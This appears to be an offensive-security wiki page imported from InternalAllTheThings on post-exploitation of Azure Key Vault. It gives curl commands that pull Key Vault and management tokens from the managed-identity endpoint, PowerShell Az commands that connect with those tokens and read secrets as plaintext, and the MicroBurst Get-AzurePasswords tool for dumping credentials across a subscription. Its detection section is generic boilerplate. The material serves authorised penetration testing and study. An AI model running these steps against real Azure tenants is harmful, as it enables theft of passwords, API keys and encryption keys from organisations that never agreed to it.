---
title: Azure Services - KeyVault
type: technique
tags: [azure, cloud, credentials, reference-import, secrets]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure Services - KeyVault

## What it is

Technical reference for **Azure Services - KeyVault** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Azure Key Vault stores secrets, certificates, and cryptographic keys that applications retrieve at runtime using managed identity tokens or service principal credentials. An attacker who compromises a managed identity or service principal with `Key Vault Secrets User` or higher permissions can query all secrets from the vault using the Key Vault REST API, harvesting database passwords, API keys, and encryption keys in one operation. Key Vault access tokens are obtained from the Instance Metadata Service on Azure VMs or from `$IDENTITY_ENDPOINT` in App Service environments, making any SSRF or RCE on a managed compute resource a path to vault credential extraction.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Access Token

* Keyvault access token

```powershell
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
```

* Connect with the access token

```ps1
PS> $token = 'eyJ0..'
PS> $keyvaulttoken = 'eyJ0..'
PS> $accid = '2e...bc'
PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
```

## Query Secrets

* Query the vault and the secrets

```ps1
PS Az> Get-AzKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName <VaultName>
PS Az> Get-AzKeyVaultSecret -VaultName <VaultName> -Name Reader -AsPlainText
```

* Extract secrets from Automations, AppServices and KeyVaults

```powershell
Import-Module Microburst.psm1
PS Microburst> Get-AzurePasswords
PS Microburst> Get-AzurePasswords -Verbose | Out-GridView
```

## References

* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
